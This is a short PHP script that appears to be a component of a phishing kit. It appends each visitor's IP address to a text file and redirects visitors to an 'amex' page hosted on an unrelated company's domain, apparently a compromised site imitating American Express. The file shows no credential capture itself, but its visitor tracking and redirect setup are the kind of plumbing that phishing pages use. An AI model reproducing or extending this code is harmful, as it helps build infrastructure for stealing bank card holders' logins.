<?php

$ip = getenv("REMOTE_ADDR");
$message .= "$ip \n";
$fp = fopen("visitIP.txt","a");
fputs($fp,$message);


$pagelink="https://nationalpolycoat.com/amex/index.php";
$FailRedirect="https://nationalpolycoat.com/amex/index.php";
$redirecttype="2";// 1:header - 2:script
?>